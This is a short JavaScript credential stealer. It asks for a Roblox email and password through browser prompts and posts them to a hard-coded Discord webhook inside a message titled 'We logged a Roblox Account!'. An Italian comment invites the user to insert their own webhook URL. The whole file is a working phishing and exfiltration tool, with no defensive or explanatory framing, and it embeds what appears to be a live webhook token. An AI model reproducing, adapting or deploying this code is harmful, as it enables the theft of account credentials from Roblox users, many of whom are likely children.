function webhookReq(webhook, email, password) {
  var params = {
      embeds: [{
            "title": `We logged a Roblox Account!`,
            "description": ">>>We logged someone; see information about the user below",
            "color": 15258703,
            "fields": [
              {
                "name": 'Email',
                "value": email,
                inline: true
              },
              {
                "name": 'Password',
                "value": password,
                inline: true
              }
            ]
    }]
  }
   
  // Send the webhook request
  fetch(webhook, {
    method: "POST",
    headers: {
      'Content-type': 'application/json'
    },
    body: JSON.stringify(params)
  })
}

// Driver Code:
var email = prompt("Enter your Roblox email:");
var password = prompt("Enter your Roblox password:");
var webhook = "https://discord.com/api/webhooks/1223034369875247226/fMwgLQQsVcDqpaIzz47iDvoggHNRG0cbFQrEQxxnjW7uDSwQfId1g5BrQSsnBZoMHa2T"; // Sostituisci con l'URL effettivo del tuo webhook

if (email && password) {
  webhookReq(webhook, email, password);
}
